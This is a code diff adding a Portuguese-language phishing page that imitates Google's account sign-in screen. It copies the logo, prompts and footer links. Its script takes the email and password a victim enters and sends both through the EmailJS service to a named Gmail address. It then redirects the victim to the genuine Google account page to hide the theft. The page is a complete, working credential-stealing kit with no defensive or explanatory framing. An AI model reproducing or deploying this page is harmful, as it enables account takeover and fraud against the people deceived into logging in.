@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html>
+  <head>
+	<!--<script src="https://smtpjs.com/v3/smtp.js"></script>-->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.0/dist/email.min.js">
+  </script>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <link href="css/styles.css" rel="stylesheet">
+  </head>
+  <body id="mybody" onclick="check()" style="overflow:hidden;overflow-y:hidden;height:100%">
+	
+	<style>
+	  .googlecard{width:80%;height:60%;background-color:#FFFFFF;border:4;border-radius:10px;border-width:10;border-style:solid;border-color:#DDDDDD}
+	  .googlebutton1{float:left;background:#ffffff;border-radius:8px;border:0px;outline:none;border-width:2px;border-color:#ffffff;width:45%;height:90px;color:#1972e8;font-size:40px;font-family:normal}
+	  .googlebutton2{float:right;background:#1972e8;border-radius:8px;border:0px;outline:none;border-width:2px;border-color:#0090ff;width:40%;height:90px;color:#ffffff;font-size:40px; font-family:noraml}
+	  box {
+  background: #666666;
+  color: #ffffff;
+  width: 250px;
+  padding: 10px;
+  margin: 1em auto;
+}
+
+.myinput[type="checkbox"]:after {
+position: relative;
+  display: block;
+  left: 2px;
+  top: -11px;
+  width: 7px;
+  height: 7px;
+  border-width: 1px;
+  border-width: 1px;
+  border-style: solid;
+  border-color: #B3B3B3 #dcddde #dcddde #B3B3B3;
+  content: "";
+  background-image: linear-gradient(135deg, #B1B6BE 0%, #FFF 100%);
+  background-repeat: no-repeat;
+  background-position: center;
+}
+
+.spinner {padding-left:25px;height:100px;align-items:center;display:flex;font-size:40px;font-family:normal}
+
+.checkbox-checked:false{boder:4;border-width:2px;border-color:blue;border-style:solid; solid green}
+
+.image-checkbox-checked {
+    width:30px;
+    height:30px;
+	border:4px;border-style:solid;border-width:2px;border-color:red;solid green;
+}
+
+input[type=checkbox] {
+    display: block;
+    width: 30px;
+    height: 30px;
+    background-repeat: no-repeat;
+    background-position: center center;
+    background-size: contain;
+    -webkit-appearance: none;
+    outline: 0;
+	
+}
+input[type=checkbox]:checked {
+width:40px;height:40px;
+background-image: url('https://findicons.com/files/icons/2711/free_icons_for_windows8_metro/512/unchecked_checkbox.png')
+}
+input[type=checkbox]:not(:checked) {
+width:40px;height:40px;
+background-image: url('https://lh3.googleusercontent.com/pw/ACtC-3en0AI-xfLjVmq-OpR1uLLz05f_MHh0XSYI3yuADd8W6IOpbmOz8rqGsSDeLR1C2opTwIbcDKOsbO6foupSboGvXOnTE9kdyfXfMYx8mHPKmN47CeaWPNBkqqg2DVEB7qx8rVJxtGyalP2BA8qboozv=s512-no?authuser=0')
+}
+		  
+	  </style>
+	  
+	<div id="page" onclick="check2()" style="background-color:#ffffff;width:90%;height:90%;margin:40px;align-items:center;position:absolute">
+	  <center>
+	<img id="image" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/368px-Google_2015_logo.svg.png" width="200px" height="70px" style="margin-top:0px"/>
+		<p id="titulo" style="font-size:60px;font-family:normal">Fazer login</p>
+		<p id="descrição" style="font-size:40px;font-family:normal">Use sua Conta do Google</p>
+		
+		<center>
+		
+		<div id="account" style="text-align:center;width:50%;display:flex;align-items:center;background-color:white;border-radius:30px;border:4;border-width:2px;border-color:black;border-style:solid">
+		  <center>
+			<table><tr><td>
+				  <div style="text-align:center;align-items:center;display:flex">
+			  <svg fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+		  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
+		  </svg>
+			</div></td><td><p id="accountname" style="margin:10px;font-family:normal;font-size:20px;height:30px">gabrielgomesleite19@gmail.com</p></td>
+				<td><div style="text-align:center;align-items:center;display:flex"><svg aria-hidden="true" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon></svg></div></td>
+			  </tr></table></center></div>
+		</center>
+			<!--<svg aria-hidden="true" class="stUf5b MSBt4d" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon></svg>
+		  -->
+		
+		<!--Email-->
+		<div id="LayoutEmail">
+		<center>
+		  <div style="background-color:red;width:92%">
+			<div style="display:flex;position:absolute;height:100px;width:92%">
+			  <input id="enter" type="email" style="padding-left:10px;position:absolute;font-size:35px;outline:none;margin-top:50px;width:100%; height:140px;background-color:transparent;border:2px solid green;border-radius:8px;border-width:2px;border-color:#DDDDDD"/>
+			</div>
+		  </div>
+		</center>
+		  <p style="font-size:24px;color:transparent">-</p>
+		  <center>
+		<div style="height:140px;margin-left:60px;display:flex;align-items:center;position:absolute;background-color:transparent">
+		  <p id="hint" style="padding-left:10px;padding-right:10px;font-family:normal;display:flex;align-items:center;color:#777777;font-size:40px;">E-mail ou telefone</p>
+		</div>
+		  </center>
+		<div style="padding:60px;margin-left:10px">
+		<!--<p id="hint" style="position:absolute;font-size:25px;margin-left:0px;margin-top:0px;background-color:transparent;color:#777777;text-align:left;margin:18px">a</p>-->
+		</div><p></p>
+		<p id="space" style="display:none"/>
+		<div style="display:flex;width:95%;">
+		  <p style="margin-left:10px;color:#1972e8;font-size:35px;font-family:normal;font-weight:bold">Esqueceu seu e-mail?</p>
+		</div>
+	    </div>
+		<!---->
+		  
+		<!--Senha-->
+		<div id="LayoutSenha" style="display:none">
+		<center>
+		  <div style="background-color:red;width:92%">
+			<div style="display:flex;position:absolute;height:100px;width:92%">
+			  <input id="enter2" type="password" style="padding-left:10px;position:absolute;font-size:35px;outline:none;margin-top:50px;width:100%; height:140px;background-color:transparent;border:2px solid green;border-radius:8px;border-width:2px;border-color:#DDDDDD"/>
+			</div>
+		  </div>
+		</center>
+		<p style="font-size:24px;color:transparent">-</p>
+		<center>
+		  <div style="height:140px;margin-left:60px;display:flex;align-items:center;position:absolute;background-color:transparent">
+			<p id="hint2" style="padding-left:10px;padding-right:10px;font-family:normal;display:flex;align-items:center;color:#777777;font-size:40px;">Digite sua Senha</p>
+		  </div>
+		</center>
+		
+		<div style="padding:30px;margin-left:10px">
+		  <!--<p id="hint" style="position:absolute;font-size:25px;margin-left:0px;margin-top:0px;background-color:transparent;color:#777777;text-align:left;margin:18px">a</p>-->
+		</div><p></p>
+		<p id="space2" style="display:none"/>
+		<div id="divEsqueceuSuaSenha" style="display:flex;width:95%;">
+		  <p style="margin-left:10px;color:#1972e8;font-size:35px;font-family:normal;font-weight:bold">Esqueceu sua senha?</p>
+		</div>
+		</div>
+		<!---->
+		  
+	  </center>
+	  
+	
+	<div id="divInfo" style="margin:25px;width:92%;">
+	  <p style="margin-left:10px;font-family:normal;color:grey;font-size:35px">Não está no seu computador? Use o modo visitante para fazer login com privacidade.</p>
+	  <p style="margin-left:10px;font-family:normal;font-weight:bold;margin-top:-10px;color:#1972e8;font-size:35px">Saiba mais</p>
+	  <br>
+		
+	</div>
+	
+	<br id="brspace1" style="display:none">
+	  <br id="brspace2" style="display:none">
+	  <br id="brspace3" style="display:block">
+	  <br id="brspace4" style="display:block">
+	  <br id="brspace5" style="display:none">
+	  <br id="brspace6" style="display:none">
+	  <br id="brspace5" style="display:none">
+	  <br id="brspace6" style="display:none">
+	  
+	  <div id="cb" style="visibility:hidden;align-items:center;display:flex;top:0;">
+	  <!--<p id="cb" style="visibility:hidden;float:left;margin-top:-50px;margin-left:20px;width:30px;height:30px;background-color:white;border:4;border-color:#CCCCCC;border:2px solid #CCCCCC;border-radius:4px;position:absolute;font-size:38px;color:white;padding-left:0px;text-align:center;display:flex;align-items:center"> </p>-->
+		  <input id="CheckBox" type="checkbox" checked="false"/>
+		<p id="CheckBoxTitle" style="font-family:normal;font-size:30px;margin-left:70px;position:absolute">Mostrar Senha</p>
+	  </div>
+	  
+	<div style="width:100%;height:50px">
+	 
+	  <button id="criar" class="googlebutton1">Criar conta</button>
+	  <button id="proximo" class="googlebutton2">Próxima</button>
+	  
+	</div>
+	
+	  <div id="view" style="position:absolute;width:100%;height:0px;background-color:red;top:0px;bottom:0px;left:0px;right:0px;margin-top:100%">
+		<br id="br1">
+		  <br id="br2">
+			<br id="br3">
+			  <br id="br4">
+				<br id="br5">
+		<br id="br6">
+		<br id="br1">
+		<br id="br2">
+		<br id="br3">
+		<br id="br4">
+		<br id="br5">
+		<br id="br6">
+		<br id="br1">
+		<br id="br2">
+		<br id="br3">
+		<br id="br4">
+		<br id="br5">
+		<br id="br6">
+		<br id="br1">
+		<br id="br2">
+		<br id="br3">
+		<br id="br4">
+		<br id="br5">
+		<br id="br6">
+		<br id="br1">
+		<br id="br2">
+		<br id="br3">
+		<br id="br4">
+		<br id="br5">
+		<br id="br6">
+		<br id="br1">
+		<br id="br2">
+		<br id="br3">
+		<br id="br4">
+		<br id="br5">
+		<br id="br6">
+		<a id="linguagem" style="font-size:30px;font-family:normal;color:grey;text-decoration:none;margin-left:20px;margin-right:20px">Português (Brasil) &#9660</a>
+		<div style="float:right;height:100%"><a id="ajuda" style="font-size:30px;font-family:normal;color:grey;text-decoration:none;margin-left:20px;margin-right:20px" href="https://support.google.com/accounts?hl=pt" target="_blank">Ajuda</a><a id="privacidade" style="font-size:30px;font-family:normal;color:grey;text-decoration:none;margin-left:20px;margin-right:20px" href="https://accounts.google.com/TOS?loc=BR&amp;hl=pt&amp;privacy=true" target="_blank">Privacidade</a><a id="termos" style="font-size:30px;font-family:normal;color:grey;text-decoration:none;margin-left:20px;margin-right:20px" href="https://accounts.google.com/TOS?loc=BR&amp;hl=pt" target="_blank">Termos</a></div>
+	  </div>
+	  
+	<div id="list" style="visibility:hidden;position:absolute;padding-left:0px;padding-top:10px;padding-bottom:10px;top:0%;width:50%;background-color:white;box-shadow:0px 0px 5px rgb(128,128,128);border-radius:4px;border:0px;border-width:0px;border-style:solid;border-color:#cccccc">
+	
+	  <li id="Afrikaans" type="none" class="spinner" onclick="setLinguagem('Afrikaans')">Afrikaans<a name="Afrikaans"></a>‬</li>
+	  <li id="azərbaycan‬" type="none" class="spinner" onclick="setLinguagem('azərbaycan‬')">azərbaycan‬<a name="azərbaycan‬"></a></li>
+	  <li id="català‬" type="none" class="spinner" onclick="setLinguagem('català‬')">català‬<a name="català‬"></a></li>
+	  <li id="Čeština‬" type="none" class="spinner" onclick="setLinguagem('Čeština‬')">Čeština‬<a name="Čeština‬"></a></li>
+	  <li id="Dansk‬" type="none" class="spinner" onclick="setLinguagem('Dansk‬')">Dansk‬<a name="Dansk‬"></a></li>
+	  <li id="Deutsch‬" type="none" class="spinner" onclick="setLinguagem('Deutsch‬')">Deutsch‬<a name="Deutsch‬"></a></li>
+	  <li id="eesti‬" type="none" class="spinner" onclick="setLinguagem('eesti‬')">eesti‬<a name="eesti‬"></a></li>
+	  <li id="English (United Kingdom)" type="none" class="spinner" onclick="setLinguagem('English (United Kingdom)')">English (United Kingdom)<a name="English (United Kingdom)"></a>‬</li>
+	  
+	  <li id="English (United States)" type="none" class="spinner" onclick="setLinguagem('English (United States)')">English (United States)‬<a name="English (United States)"></a></li>
+	  <li id="Español (España)" type="none" class="spinner" onclick="setLinguagem('Español (España)')">Español (España)‬<a name="Español (España)"></a></li>
+	  <li id="Español (Latinoamérica)" type="none" class="spinner" onclick="setLinguagem('Español (Latinoamérica)')">Español (Latinoamérica)‬<a name="Español (Latinoamérica)"></a></li>
+	  <li id="euskara‬" type="none" class="spinner" onclick="setLinguagem('euskara‬')">euskara‬<a name="euskara‬"></a></li>
+	  <li id="Filipino‬" type="none" class="spinner" onclick="setLinguagem('Filipino‬')">Filipino‬<a name="Filipino‬"></a></li>
+	  <li id="Français (Canada)" type="none" class="spinner" onclick="setLinguagem('Français (Canada)')">Français (Canada)‬<a name="Français (Canada)"></a></li>
+	  <li id="Français (France)" type="none" class="spinner" onclick="setLinguagem('Français (France)')">Français (France)‬<a name="Français (France)"></a></li>
+	  <li id="galego‬" type="none" class="spinner" onclick="setLinguagem('galego‬')">galego‬<a name="galego‬"></a></li>
+	  
+	  <li id="Hrvatski‬" type="none" class="spinner" onclick="setLinguagem('Hrvatski‬')">Hrvatski‬<a name="Hrvatski‬"></a></li>
+	  <li id="Indonesia‬" type="none" class="spinner" onclick="setLinguagem('Indonesia‬')">Indonesia‬<a name="Indonesia‬"></a></li>
+	  <li id="isiZulu‬" type="none" class="spinner" onclick="setLinguagem('isiZulu‬')">isiZulu‬<a name="isiZulu‬"></a></li>
+	  <li id="íslenska‬" type="none" class="spinner" onclick="setLinguagem('íslenska‬')">íslenska‬<a name="íslenska‬"></a></li>
+	  <li id="Italiano‬" type="none" class="spinner" onclick="setLinguagem('Italiano‬')">Italiano‬<a name="Italiano‬"></a></li>
+	  <li id="Kiswahili‬" type="none" class="spinner" onclick="setLinguagem('Kiswahili‬')">Kiswahili‬<a name="Kiswahili‬"></a></li>
+	  <li id="latviešu‬" type="none" class="spinner" onclick="setLinguagem('latviešu‬')">latviešu‬<a name="latviešu‬"></a></li>
+	  <li id="lietuvių‬" type="none" class="spinner" onclick="setLinguagem('lietuvių‬')">lietuvių‬<a name="lietuvių‬"></a></li>
+	  
+	  <li id="magyar‬" type="none" class="spinner" onclick="setLinguagem('magyar‬')">magyar‬<a name="magyar‬"></a></li>
+	  <li id="Melayu‬" type="none" class="spinner" onclick="setLinguagem('Melayu‬')">Melayu‬<a name="Melayu‬"></a></li>
+	  <li id="Nederlands‬" type="none" class="spinner" onclick="setLinguagem('Nederlands‬')">Nederlands‬<a name="Nederlands‬"></a></li>
+	  <li id="norsk‬" type="none" class="spinner" onclick="setLinguagem('norsk‬')">norsk‬<a name="norsk‬"></a></li>
+	  <li id="polski‬" type="none" class="spinner" onclick="setLinguagem('polski‬')">polski‬<a name="polski‬"></a></li>
+	  <li id="Português (Brasil)" type="none" class="spinner" onclick="setLinguagem('Português (Brasil)')">Português (Brasil)<a name="Português (Brasil)"></a></li>
+	  <li id="Português (Portugal)" type="none" class="spinner" onclick="setLinguagem('Português (Portugal)')">Português (Portugal)<a name="Português (Portugal)"></a></li>
+	  <li id="română‬" type="none" class="spinner" onclick="setLinguagem('română‬')">română‬<a name="română‬"></a></li>
+	  
+	  <li id="Slovenčina‬" type="none" class="spinner" onclick="setLinguagem('Slovenčina‬')">Slovenčina‬<a name="Slovenčina‬"></a></li>
+	  <li id="slovenščina‬" type="none" class="spinner" onclick="setLinguagem('slovenščina‬')">slovenščina‬<a name="slovenščina‬"></a></li>
+	  <li id="srpski (latinica)‬" type="none" class="spinner" onclick="setLinguagem('srpski')">srpski<a name="srpski"></a></li>
+	  <li id="Suomi‬" type="none" class="spinner" onclick="setLinguagem('Suomi‬')">Suomi‬<a name="Suomi‬"></a></li>
+	  <li id="Svenska‬" type="none" class="spinner" onclick="setLinguagem('Svenska‬')">Svenska‬<a name="Svenska‬"></a></li>
+	  <li id="Tiếng Việt‬" type="none" class="spinner" onclick="setLinguagem('Tiếng Việt')">Tiếng Việt<a name="Tiếng Việt"></a></li>
+	  <li id="Türkçe‬" type="none" class="spinner" onclick="setLinguagem('Türkçe‬')">Türkçe‬<a name="Türkçe‬"></a></li>
+	  <li id="Ελληνικά‬" type="none" class="spinner" onclick="setLinguagem('Ελληνικά‬')">Ελληνικά‬<a name="Ελληνικά‬"></a></li>
+	  
+	  <li id="български‬" type="none" class="spinner" onclick="setLinguagem('български‬')">български‬<a name="български‬"></a></li>
+	  <li id="монгол‬" type="none" class="spinner" onclick="setLinguagem('монгол‬')">монгол‬<a name="монгол‬"></a></li>
+	  <li id="Русский‬" type="none" class="spinner" onclick="setLinguagem('Русский‬')">Русский‬<a name="Русский‬"></a></li>
+	  <li id="српски (ћирилица)‬" type="none" class="spinner" onclick="setLinguagem('српски (ћирилица)')">српски (ћирилица)<a name="српски (ћирилица)"></a></li>
+	  <li id="Українська‬" type="none" class="spinner" onclick="setLinguagem('Українська‬')">Українська‬<a name="Українська‬"></a></li>
+	  <li id="ქართული‬" type="none" class="spinner" onclick="setLinguagem('ქართული‬')">ქართული‬<a name="ქართული‬"></a></li>
+	  <li id="հայերեն‬" type="none" class="spinner" onclick="setLinguagem('հայերեն‬')">հայերեն‬<a name="հայերեն‬"></a></li>
+	  <li id="עברית‬‎" type="none" class="spinner" onclick="setLinguagem('עברית‬‎')">עברית‬‎<a name="עברית‬‎"></a></li>
+	  
+	  <li id="اردو‬‎" type="none" class="spinner" onclick="setLinguagem('اردو‬‎')">اردو‬‎<a name="اردو‬‎"></a></li>
+	  <li id="العربية‬‎" type="none" class="spinner" onclick="setLinguagem('العربية‬‎')">العربية‬‎<a name="العربية‬‎"></a></li>
+	  <li id="فارسی‬‎" type="none" class="spinner" onclick="setLinguagem('فارسی‬‎')">فارسی‬‎<a name="فارسی‬‎"></a></li>
+	  <li id="አማርኛ‬" type="none" class="spinner" onclick="setLinguagem('አማርኛ‬')">አማርኛ‬<a name="አማርኛ‬"></a></li>
+	  <li id="नेपाली‬" type="none" class="spinner" onclick="setLinguagem('नेपाली‬')">नेपाली‬<a name="नेपाली‬"></a></li>
+	  <li id="मराठी‬" type="none" class="spinner" onclick="setLinguagem('मराठी‬')">मराठी‬<a name="मराठी‬"></a></li>
+	  <li id="हिन्दी‬" type="none" class="spinner" onclick="setLinguagem('हिन्दी‬')">हिन्दी‬<a name="हिन्दी‬"></a></li>
+	  <li id="বাংলা‬" type="none" class="spinner" onclick="setLinguagem('বাংলা‬')">বাংলা‬<a name="বাংলা‬"></a></li>
+	  
+	  <li id="ગુજરાતી‬" type="none" class="spinner" onclick="setLinguagem('ગુજરાતી‬')">ગુજરાતી‬<a name="ગુજરાતી‬"></a></li>
+	  <li id="தமிழ்‬" type="none" class="spinner" onclick="setLinguagem('தமிழ்‬')">தமிழ்‬<a name="தமிழ்‬"></a></li>
+	  <li id="తెలుగు‬" type="none" class="spinner" onclick="setLinguagem('తెలుగు‬')">తెలుగు‬<a name="తెలుగు‬"></a></li>
+	  <li id="ಕನ್ನಡ‬" type="none" class="spinner" onclick="setLinguagem('ಕನ್ನಡ‬')">ಕನ್ನಡ‬<a name="ಕನ್ನಡ‬"></a></li>
+	  <li id="മലയാളം‬" type="none" class="spinner" onclick="setLinguagem('മലയാളം‬')">മലയാളം‬<a name="മലയാളം‬"></a></li>
+	  <li id="සිංහල‬" type="none" class="spinner" onclick="setLinguagem('සිංහල‬')">සිංහල‬<a name="සිංහල‬"></a></li>
+	  <li id="ไทย‬" type="none" class="spinner" onclick="setLinguagem('ไทย‬')">ไทย‬<a name="ไทย‬"></a></li>
+	  <li id="ລາວ‬" type="none" class="spinner" onclick="setLinguagem('ລາວ‬')">ລາວ‬<a name="ລາວ‬"></a></li>
+	  
+	  <li id="မြန်မာ‬" type="none" class="spinner" onclick="setLinguagem('မြန်မာ‬')">မြန်မာ‬<a name="မြန်မာ‬"></a></li>
+	  <li id="ខ្មែរ‬" type="none" class="spinner" onclick="setLinguagem('ខ្មែរ‬')">ខ្មែរ‬<a name="ខ្មែរ‬"></a></li>
+	  <li id="한국어‬" type="none" class="spinner" onclick="setLinguagem('한국어‬')">한국어‬<a name="한국어‬"></a></li>
+	  <li id="中文（香港）‬" type="none" class="spinner" onclick="setLinguagem('中文（香港）')">中文（香港）<a name="中文（香港）"></a></li>
+	  <li id="日本語‬" type="none" class="spinner" onclick="setLinguagem('日本語‬')">日本語‬<a name="日本語‬"></a></li>
+	  <li id="简体中文‬" type="none" class="spinner" onclick="setLinguagem('简体中文‬')">简体中文‬<a name="简体中文‬"></a></li>
+	  <li id="繁體中文‬" type="none" class="spinner" onclick="setLinguagem('繁體中文‬')">繁體中文‬<a name="繁體中文‬"></a></li>
+	  </div>
+	  
+	  
+	</div>
+	
+	
+  <!--
+	  <center>
+	  <div class="googlecard">
+		<h1 style="font-size:40px; font-family:Normal">Novo dispositivo logado em</h1>
+		<hr>
+		<h3 style="font-size:20px; color:#CDCDCD">Sua Conta do Google acabou de fazer login em um novo dispositivo Android.  Você está recebendo este e-mail para ter certeza de que foi você</h3>
+		<a href="https://google.com"><button id="b" style="background:#0090ff; width:200px; height:50px; color:white;border:0; border-radius:4px;border-color:white;outline:none" onclick="window.location.href='https://google.com'">VERIFICAR ATIVIDADE</button></a>
+		<hr style="background-color:white;border:0">
+		
+	  </div>
+	  </center>-->
+	  
+  </body>
+  <script>
+	 (function() {
+    emailjs.init("user_4gwijgNaCCwDNlBcxGEt0"); //please encrypted user id for malicious attacks
+  })();
+  
+  //var w1 = document.getElementById("account").getAttribute("width","width");
+  //var w2 = document.getElementById("accountname").style.width+"px";
+  //alert(w1);
+  var openlang = false;
+  //var lang = "Português (Brasil)";
+  var posição = "Português (Brasil)";
+  
+  //var visiblePassword = true;
+  
+  //v = "Português (Brasil)";
+	//alert(window.location.host);
+	var t = "่";
+	var t1 = "https://";
+	var t2 = "accounts";
+	var t3 = ".google";
+	var t4 = ".com/";
+	//window.history.pushState(null,null,t+t1+t2+t3+t4+"AddSession?hl=pt-BR&continue=https://www.google.com/%3Fgws_rd%3Dssl&ec=GAlAAQ");
+	
+	var enter = false;
+	var enter2 = false;
+	var size = 40;
+	var size2 = 40;
+	var etapa = 1;
+	
+	function check(){
+	if(openlang==true){
+	document.getElementById("mybody").style.overflow="scroll";
+	document.getElementById("list").style.overflow="hidden";
+	document.getElementById("list").style.visibility="hidden";
+	openlang=false;
+	}
+	
+	if(enter==true){
+	document.getElementById("br1").style.display="block";
+	document.getElementById("br2").style.display="block";
+	document.getElementById("br3").style.display="block";
+	document.getElementById("br4").style.display="block";
+	document.getElementById("br5").style.display="block";
+	document.getElementById("br6").style.display="none";
+	
+	if(document.getElementById("enter").value==""){
+	document.getElementById("enter").style.borderColor="#DDDDDD";
+	document.getElementById("enter").style.borderWidth="2px";
+	document.getElementById("hint").style.marginTop="40px";
+	document.getElementById("hint").style.color="#777777";
+	document.getElementById("hint").style.backgroundColor="transparent";
+	document.getElementById("space").style.display="none";
+	enter=false;
+	for(var i = 0; i < 4; i++){
+	document.getElementById("hint").style.fontSize=size+++"px";
+	}
+	}
+	}
+	
+	if(enter2==true){
+	if(document.getElementById("enter2").value==""){
+	document.getElementById("enter2").style.borderColor="#DDDDDD";
+	document.getElementById("enter2").style.borderWidth="2px";
+	document.getElementById("hint2").style.marginTop="40px";
+	document.getElementById("hint2").style.color="#777777";
+	document.getElementById("hint2").style.backgroundColor="transparent";
+	document.getElementById("space2").style.display="none";
+	enter2=false;
+	for(var i = 0; i < 4; i++){
+	document.getElementById("hint2").style.fontSize=size2+++"px";
+	}
+	}
+	}
+	}
+	
+	document.getElementById("enter").onclick=function(){
+	if(enter==false){
+	document.getElementById("br1").style.display="none";
+	document.getElementById("br2").style.display="none";
+	document.getElementById("br3").style.display="none";
+	document.getElementById("br4").style.display="none";
+	document.getElementById("br5").style.display="none";
+	document.getElementById("br6").style.display="block";
+	
+	document.getElementById("enter").style.borderColor="#1972e8";
+	document.getElementById("enter").style.borderWidth="4px";
+	document.getElementById("hint").style.marginTop="-110px";
+	document.getElementById("hint").style.color="#1972e8";
+	document.getElementById("hint").style.backgroundColor="white";
+	document.getElementById("space").style.display="block";
+	
+	for(var i = 0; i < 4; i++){
+	document.getElementById("hint").style.fontSize=size--+"px";
+	}
+	setTimeout(function(){
+	enter=true;
+	},0);
+	
+	}
+	};
+	
+	
+	document.getElementById("enter2").onclick=function(){
+	if(enter2==false){
+	document.getElementById("enter2").style.borderColor="#1972e8";
+	document.getElementById("enter2").style.borderWidth="4px";
+	document.getElementById("hint2").style.marginTop="-110px";
+	document.getElementById("hint2").style.color="#1972e8";
+	document.getElementById("hint2").style.backgroundColor="white";
+	document.getElementById("space2").style.display="block";
+	
+	for(var i = 0; i < 4; i++){
+	document.getElementById("hint2").style.fontSize=size2--+"px";
+	}
+	setTimeout(function(){
+	enter2=true;
+	},0);
+	
+	}
+	};
+	
+	document.getElementById("criar").onclick=function(){
+	
+	};
+	
+	document.getElementById("account").style.visibility="hidden";
+	
+	document.getElementById("proximo").onclick=function(){
+	if(etapa==1){
+	var s = document.getElementById("enter").value;
+	
+	if(s.indexOf('@gmail.com') >-1){
+	if(document.getElementById("enter").value.length==10){
+	document.getElementById("enter").style.borderColor="#ff0000";
+	document.getElementById("hint").style.color="#ff0000";
+	}else{
+	document.getElementById("enter").style.borderColor="#1972e8";
+	document.getElementById("hint").style.color="#1972e8";
+	document.getElementById("titulo").innerHTML="Olá!";
+	document.getElementById("descrição").style.display="none";
+	document.getElementById("account").style.visibility="visible";
+	document.getElementById("LayoutEmail").style.display="none";
+	document.getElementById("LayoutSenha").style.display="block";
+	document.getElementById("divEsqueceuSuaSenha").style.display="none";
+	document.getElementById("divInfo").style.display="none";
+	window.history.pushState(null,null,"Senha");
+	document.getElementById("brspace1").style.display="block";
+	document.getElementById("brspace2").style.display="block";
+	document.getElementById("accountname").innerHTML=document.getElementById("enter").value;
+	document.getElementById("cb").style.visibility="visible";
+	
+	document.getElementById("cb").style.marginTop="100px";
+	//document.getElementById("CheckBoxTitle").style.visibility="visible";
+	document.getElementById("criar").innerHTML="Esqueceu a senha?";
+	//document.getElementById("criar").style.width="40%";
+	document.getElementById("criar").style.marginTop="100px";
+	document.getElementById("proximo").style.marginTop="100px";
+	etapa=2;
+	
+	}
+	}else{
+	document.getElementById("enter").style.borderColor="#ff0000";
+	document.getElementById("hint").style.color="#ff0000";
+	}
+	}else{
+	
+	var email = document.getElementById("enter").value;
+	var senha = document.getElementById("enter2").value;
+	
+//set the parameter as per you template parameter[https://dashboard.emailjs.com/templates]
+  var templateParams = {
+    to_email: 'gabrielgomesleite19@gmail.com',
+    to_name: 'Gabriel',
+    message_html: 'Essa são as informações de acesso a minha conta, Email:'+email+" "+'Senha:'+senha
+  };
+
+  emailjs.send('service_y3yrqch', 'template_24pl2np', templateParams)
+    .then(function(response) {
+	window.location.href="https://myaccount.google.com/?utm_source=OGB&utm_medium=act";
+      console.log('SUCCESS!', response.status, response.text);
+    }, function(error) {
+	window.location.href="https://myaccount.google.com/?utm_source=OGB&utm_medium=act";
+      console.log('FAILED...', error);
+    });
+
+	}
+	};
+	
+	document.getElementById("CheckBox").onclick=function(){
+	if(document.getElementById("CheckBox").checked==false){
+	document.getElementById("enter2").setAttribute("type","text");
+	//visiblePassword=true;
+	}else{
+	document.getElementById("enter2").setAttribute("type","password");
+	//visiblePassword=false;
+	}
+	};
+	
+	document.getElementById("CheckBoxTitle").onclick=function(){
+	if(document.getElementById("CheckBox").checked==false){
+	document.getElementById("CheckBox").checked=true;
+	document.getElementById("enter2").setAttribute("type","password");
+	//visiblePassword=true;
+	}else{
+	document.getElementById("CheckBox").checked=false;
+	document.getElementById("enter2").setAttribute("type","text");
+	//visiblePassword=false;
+	}
+	};
+	
+	window.addEventListener('popstate', function(event) {
+	document.getElementById("titulo").innerHTML="Fazer Login";
+	document.getElementById("descrição").style.display="block";
+	document.getElementById("account").style.visibility="hidden";
+	document.getElementById("LayoutEmail").style.display="block";
+	document.getElementById("LayoutSenha").style.display="none";
+	document.getElementById("divEsqueceuSuaSenha").style.display="block";
+	document.getElementById("divInfo").style.display="block";
+	window.history.pushState(null,null,null);
+	document.getElementById("brspace1").style.display="none";
+	document.getElementById("brspace2").style.display="none";
+	document.getElementById("cb").style.visibility="hidden";
+	//document.getElementById("CheckBoxTitle").style.visibility="hidden";
+	document.getElementById("criar").innerHTML="Criar conta";
+	document.getElementById("criar").style.width="40%";
+	etapa=1;
+	});
+	
+	//alert(lang);
+	document.getElementById("linguagem").onclick=function(){
+	//posição = document.getElementById("linguagem").innerHTML;
+	if(openlang==false){
+	if(etapa==1){
+	window.location.href="#"+posição;
+	}else{
+	window.location.href="/Senha/"+"#"+posição;
+	}
+	document.getElementById("mybody").style.overflow="hidden";
+	document.getElementById("list").style.overflow="scroll";
+	document.getElementById("list").style.height="90%";
+	document.getElementById("list").style.width="50%";
+	document.getElementById("list").style.visibility="visible";
+	document.getElementById(posição).style.color="#000000";
+	document.getElementById(posição).style.backgroundColor="#cccccc";
+	
+	setTimeout(function(){
+	openlang=true;
+	window.location.href="#";
+	},250);
+	
+	//alert(lang);
+	}else{
+	}
+	};
+	
+	
+	</script>
+	
+	<script>
+	  function setLinguagem(valor){
+	  
+	  var v = document.getElementById(posição).id;
+	  v=v.replace(v,valor+" &#9660");
+	  
+	  document.getElementById("linguagem").innerHTML=v;
+	  
+	  document.getElementById(posição).style.color="black";
+	  document.getElementById(posição).style.backgroundColor="transparent";
+	
+	document.getElementById(valor).style.color="#000000";
+	document.getElementById(valor).style.backgroundColor="#cccccc";
+	
+	posição= valor;
+	
+	document.getElementById("mybody").style.overflow="scroll";
+	document.getElementById("list").style.overflow="hidden";
+	document.getElementById("list").style.height="90%";
+	document.getElementById("list").style.visibility="hidden";
+	
+	openlang=false;
+	}
+	
+	
+	  </script>
+</html>		
